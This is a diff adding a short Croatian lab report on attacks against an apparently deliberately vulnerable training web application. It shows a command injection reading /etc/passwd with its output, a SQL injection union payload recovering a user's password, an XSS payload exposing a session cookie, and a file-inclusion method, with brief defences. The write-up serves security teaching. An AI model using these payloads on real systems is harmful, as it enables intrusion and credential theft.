@@ -1,0 +1,44 @@
+1) Izvođenje naredbi (command injection)
+Korištena naredba: 1 | cat /etc/passwd
+Ispis:
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+2)Napadi SQL umetanjem (SQL injection)
+Korištena naredba: 1' UNION SELECT first_name, password FROM users WHERE 				first_name='Pablo' AND last_name='Picasso' --
+Lozinka korisnika Pablo Picasso: letmein
+
+3)XSS
+U polje ,,Message" može se predati programski kod unutar taga <script> koji će se zbog ranjivosti na backendu aplikacije izvršiti. Ovako je moguće doći do raznih podataka, kao što je u ovom slučaju cookie.
+
+Korištena naredba: <script>alert(document.cookie)</script>
+PHPSESSID=0m3hneivhfq5k7qv3qgk4tofi3
+
+Ova naredba će ispisati na ekran trenutni cookie koji se onda može proslijediti dalje (npr. unutar metode GET) i omogućiti daljnje napade.
+
+Ovakve napade moguće je izbjeći provjerom ulaznih podataka te korištenjem sigurnih JS funkcija.
+
+4)Umetanje datoteka (File inclusion)
+Manipuliranje GET metodom i ispisivanje datoteke u ovom su primjeri vrlo jednostavni: URL jasno sadrži polje "?page=" u koje se može upisati putanja datoteke koju se želi ispisati.
+
+Od ovog napada se može zaštititi boljim formatiranjem URL-ova, izbjegavanjem direktnog unosa u include() i require() te korištenjem whitelista.
+
